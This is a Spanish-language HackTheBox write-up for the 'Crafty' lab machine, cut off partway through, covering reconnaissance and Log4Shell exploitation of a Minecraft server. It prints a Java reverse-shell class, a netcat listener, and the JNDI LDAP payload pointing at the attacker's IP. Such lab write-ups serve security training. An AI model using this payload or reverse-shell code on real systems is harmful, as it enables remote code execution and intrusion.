<!doctype html><html lang=es><head><title>HTB Crafty WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Crafty' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Crafty WriteUp"><meta name=twitter:description content="HackThebox 'Crafty' WriteUp"><meta property="og:title" content="HTB Crafty WriteUp"><meta property="og:description" content="HackThebox 'Crafty' WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/crafty/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-15T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-15T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/crafty/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/crafty/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/crafty/>HTB Crafty WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-06-15T00:00:00Z>15 junio, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
10 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/log4j/>Log4j</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/log4shell/>Log4shell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/minecraft/>Minecraft</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/runascs/>Runascs</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/java/>Java</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/jd-gui/>Jd-Gui</a></span></div></div></header><div class=post-content><h1 id=crafty----hackthebox>Crafty &ndash; HackTheBox
<a class=heading-link href=#crafty----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty / Dificultad: <em>Easy</em> / <em>F√°cil</em></li><li>Platform / Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Crafty&rsquo; Avatar" src=/pentesting/images/Crafty_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Crafty</code> es una m√°quina f√°cil de la plataforma <code>HackTheBox</code> la cual tiene una version vulnerable de <code>Log4J</code> (una biblioteca presente en muchas aplicaciones escritas en <code>Java</code>) en un viejo servidor de Minecraft. Empezando, chequeamos los puertos TCP abiertos donde encontramos que, en efecto, la m√°quina corresponde a un servidor de <code>Minecraft</code>. Analizando su version vemos que √©ste contiene una version vulnerable de la biblioteca <code>Log4J</code>, la cual nos permite ejecutar el famoso exploit <code>Log4Shell</code> (<a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228 class=external-link target=_blank rel=noopener>CVE-2021-44228</a>) y ganar acceso a la m√°quina como el usuario <code>svc_minecraft</code>. Una vez dentro de la m√°quina, somos capaces de extraer un archivo <code>Java</code> <code>.tar</code> el cual contiene credenciales. Usando <code>RunasCs</code>, revisamos si estas credenciales pertenecen al usuario <code>Administrator</code>; y efectivamente s√≠ pertenecen, de manera que somos capaces de ganar acceso al usuario <code>Administrator</code> y as√≠ comprometer completamente la m√°quina.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Empezando con un scan con <code>Nmap</code> s√≥lo muestra 2 servicios corriendo por protocolo <code>TCP</code>: <code>80</code> <code>HTTP</code> (en un servicio <code>Microsoft IIS</code>) y <code>25565</code> un servicio de <code>Minecraft</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn -vvv 10.10.11.249
</span></span></span></code></pre></div><p>y chequeando las versiones de los puertos abiertos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p80,25565 10.10.11.249 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 17:20 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.249
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.17s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE   VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http      Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://crafty.htb
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
</span></span></span></code></pre></div><ul><li>Del output del scan puedo ver que el sitio web del puerto <code>80</code> redirige a <code>crafty.htb</code>. De manera que agrego este dominio a mi archivo <code>/etc/hosts</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.249 crafty.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><ul><li>Visitando el sitio <code>http://crafty.htb</code> muestra una p√°gina basada en <code>Minecraft</code> la cual muestra, aparentemente, datos de √©ste:</li></ul><p><img alt="Crafty 1" src=/pentesting/images/Crafty_1.png></p><p>El sitio muestra el subdominio <code>play.crafty.htb</code>, de manera que tambi√©n decido agregar este nuevo subdominio a mi archivo <code>/etc/hosts</code>, de manera que √©ste ahora se ve como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.249 crafty.htb play.crafty.htb
</span></span></span></code></pre></div><p>pero visitando <code>play.crafty.htb</code> simplemente redirige a <code>crafty.htb</code>. Por ejemplo, analizando el sitio con <code>WhatWeb</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb http://play.crafty.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://play.crafty.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], Microsoft-IIS[10.0], RedirectLocation[http://crafty.htb], Title[Document Moved]
</span></span></span><span class=line><span class=cl><span class=go>http://crafty.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]
</span></span></span></code></pre></div><ul><li>Decido buscar por directorios intentando un <code>Brute Force Directory Listing</code> con <code>Gobuster</code>, pero no obtuve nada interesante:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://crafty.htb -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://crafty.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/home                 (Status: 200) [Size: 1826]
</span></span></span><span class=line><span class=cl><span class=go>/img                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/img/]
</span></span></span><span class=line><span class=cl><span class=go>/Home                 (Status: 200) [Size: 1826]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/css/]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 144] [--&gt; http://crafty.htb/js/]
</span></span></span><span class=line><span class=cl><span class=go>/IMG                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/IMG/]
</span></span></span><span class=line><span class=cl><span class=go>/CSS                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/CSS/]
</span></span></span><span class=line><span class=cl><span class=go>/Img                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/Img/]
</span></span></span><span class=line><span class=cl><span class=go>/JS                   (Status: 301) [Size: 144] [--&gt; http://crafty.htb/JS/]
</span></span></span><span class=line><span class=cl><span class=go>/HOME                 (Status: 200) [Size: 1826]
</span></span></span><span class=line><span class=cl><span class=go>/coming-soon          (Status: 200) [Size: 1206]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 220560 / 220561 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><ul><li>En este punto pongo mi atenci√≥n en el puerto <code>25565</code> mostrado por el scan de <code>Nmap</code>. Googleando <code>Minecraft 1.16.5 exploit</code> muestra que √©ste contiene una version de <code>Log4J</code> vulnerable a <code>Log4Shell</code> (<a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228 class=external-link target=_blank rel=noopener>CVE-2021-44228</a>). De manera que, aparentemente, necesitamos correr comandos en el servidor de <code>Minecraft</code> para obtener una shell en nuestra m√°quina de atacante. Para esto tenemos 2 opciones:<ol><li>Descargar un launcher de <code>Minecraft</code> para <code>Linux</code> (dado que mi m√°quina de atacante es una m√°quina <code>Linux</code>). Esto puede requerir <code>TLauncher</code> de manera que, de ser posible, prefiero saltarme esta opci√≥n&mldr;</li><li>Usar una librer√≠a de <code>Python</code> llamada <code>pyCraft</code> (cuyo repositorio lo podemos visitar desde <a href=https://github.com/ammaraskar/pyCraft class=external-link target=_blank rel=noopener>este link</a>) y tratar de correr los comandos en el servidor de Minecraft dentro de este script.
I will use the second option.</li></ol></li><li>Primero, clono el repositorio <code>pyCraft</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/ammaraskar/pyCraft.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;pyCraft&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 3182, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (158/158), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (70/70), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 3182 (delta 106), reused 112 (delta 88), pack-reused 3024
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (3182/3182), 775.28 KiB | 2.42 MiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (2222/2222), done.
</span></span></span></code></pre></div><p>Luego, creamos un entorno virtual dentro de <code>Python</code>, lo activamos e instalamos todas las librer√≠as necesarias para <code>pycraft.py</code> en √©l. En mi caso crear√© un entorno virtual llamado <code>minecraftENV</code>, e instalar todo lo necesario en √©l:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cd pyCraft
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 -m venv minecraftENV
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ source minecraftENV/bin/activate
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ pip3 install -r requirements.txt
</span></span></span></code></pre></div><ul><li>Luego, para explotar <code>Log4J</code> usaremos <a href=https://github.com/kozmer/log4j-shell-poc.git class=external-link target=_blank rel=noopener>este repositorio de Github</a>. Una vez clonado e instalado √©ste todav√≠a requiere algunos archivos externos para funcionar. Adem√°s, desde el repositorio de <code>log4shell-poc</code>, cambiaremos algunas l√≠neas del script <code>poc.py</code>. Para esto cambiamos las l√≠neas:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exploit</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Exploit</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>host</span><span class=o>=</span><span class=s>&#34;%s&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>port</span><span class=o>=%</span><span class=n>d</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=o>=</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ProcessBuilder</span><span class=p>(</span><span class=n>cmd</span><span class=p>).</span><span class=na>redirectErrorStream</span><span class=p>(</span><span class=kc>true</span><span class=p>).</span><span class=na>start</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Socket</span><span class=w> </span><span class=n>s</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Socket</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>pi</span><span class=o>=</span><span class=n>p</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span><span class=w>
</span></span></span></code></pre></div><p>a</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exploit</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Exploit</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>host</span><span class=o>=</span><span class=s>&#34;%s&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>port</span><span class=o>=%</span><span class=n>d</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=o>=</span><span class=s>&#34;cmd.exe&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ProcessBuilder</span><span class=p>(</span><span class=n>cmd</span><span class=p>).</span><span class=na>redirectErrorStream</span><span class=p>(</span><span class=kc>true</span><span class=p>).</span><span class=na>start</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Socket</span><span class=w> </span><span class=n>s</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Socket</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>pi</span><span class=o>=</span><span class=n>p</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=w>
</span></span></span></code></pre></div><p>Donde hemos cambiado <code>/bin/sh</code> (la cual sirve para obtener una shell desde un servidor <code>Linux</code>, que no es el caso) a <code>cmd.exe</code> (para obtener una shell de un servidor <code>Windows</code>, el cual s√≠ es el caso para la m√°quina <code>Crafty</code>)</p><ul><li>Como dijjimos anteriormente, necesitamos un archivo <code>Java</code> para correr este exploit. Usualmente uno intentar√≠a distintas versiones de este archivo hasta encontrar aquella que funcione, pero en nuestro caso (y para ahorrar tiempo) usaremos la versi√≥n <code>8</code>. Podemos descargar el archivo necesario desde <a href=https://repo.huaweicloud.com/java/jdk/8u181-b13/ class=external-link target=_blank rel=noopener>este repositorio</a> y extraerlo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-17 18:00:39--  https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>Resolving repo.huaweicloud.com (repo.huaweicloud.com)... 119.8.158.18, 119.8.158.19, 119.8.158.17
</span></span></span><span class=line><span class=cl><span class=go>Connecting to repo.huaweicloud.com (repo.huaweicloud.com)|119.8.158.18|:443... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 185646832 (177M) [application/octet-stream]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòjdk-8u181-linux-x64.tar.gz‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>jdk-8u181-linux-x64.tar.gz                 100%[=======================================================================================&gt;] 177.05M  55.3MB/s    in 3.3s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-05-17 18:00:42 (53.9 MB/s) - ‚Äòjdk-8u181-linux-x64.tar.gz‚Äô saved [185646832/185646832]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ tar -xf jdk-8u181-linux-x64.tar.gz
</span></span></span></code></pre></div><p>Al archivo extra√≠do debemos renombrarlo como <code>jdk1.8.0_20</code> dado que este es el nombre usado para el archivo en el script <code>poc.py</code>. De manera que lo renombramos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ mv jdk1.8.0_181 jdk1.8.0_20
</span></span></span></code></pre></div><p>As√≠, nuestro directorio <code>log4j-shell-poc</code> ahora se ve como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 181352
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 6 gunzf0x gunzf0x      4096 May 17 18:02 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x      4096 May 17 17:54 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x       177 May 17 17:54 Dockerfile
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 8 gunzf0x gunzf0x      4096 May 17 17:54 .git
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x        23 May 17 17:54 .gitignore
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 7 gunzf0x gunzf0x      4096 Jul  7  2018 jdk1.8.0_20
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 185646832 Jul  8  2018 jdk-8u181-linux-x64.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x      1060 May 17 17:54 LICENSE
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 gunzf0x gunzf0x      4208 May 17 17:58 poc.py
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x      3051 May 17 17:54 README.md
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x        18 May 17 17:54 requirements.txt
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x      4096 May 17 17:54 target
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x      4096 May 17 17:54 vulnerable-application
</span></span></span></code></pre></div><ul><li>Ahora que finalmente tenemos todo listo podemos correr el exploit. Primero, empezamos un listener con <code>netcat</code>, en mi caso, en el puerto <code>443</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><ul><li>Luego, corremos el exploit:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 poc.py --userip 10.10.16.2 --webport 80 --lport 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] CVE: CVE-2021-44228
</span></span></span><span class=line><span class=cl><span class=go>[!] Github repo: https://github.com/kozmer/log4j-shell-poc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>[+] Exploit java class created success
</span></span></span><span class=line><span class=cl><span class=go>[+] Setting up LDAP server
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Send me: ${jndi:ldap://10.10.16.2:1389/a}
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Starting Webserver on port 80 http://0.0.0.0:80
</span></span></span><span class=line><span class=cl><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>Listening on 0.0.0.0:1389
</span></span></span></code></pre></div><p>donde <code>10.10.16.2</code> es mi IP de atacante y <code>443</code> es el puerto en el cual estoy en escucha con <code>netcat</code>. Pero no estamos listos.
Tal cual el programa dice, necesitamos ejecutar el payload malicioso para <code>Log4J</code>, en este caso, <code>${jndi:ldap://10.10.16.2:1389/a}</code> en el servidor v√≠ctima para activar las instrucciones para una reverse shell.</p><ul><li>Ahora, empezamos/corremos <code>pyCraft</code>. Podemos usarlo en modo offline (de manera que no necesitamos tener una cuenta de <code>Minecraft</code>):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 start.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Enter your username: gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>Enter your password (leave blank for offline mode):
</span></span></span><span class=line><span class=cl><span class=go>Enter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249
</span></span></span><span class=line><span class=cl><span class=go>Connecting in offline mode...
</span></span></span><span class=line><span class=cl><span class=go>Connected.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>$</span><span class=o>{</span>jndi:ldap://10.10.16.2:1389/a<span class=o>}</span>
</span></span></code></pre></div><p>donde, al final, he escrito <code>${jndi:ldap://10.10.16.2:1389/a}</code>.</p><ul><li>Luego de hacer esto obtengo una shell como el usuario <code>svc_minecraft</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
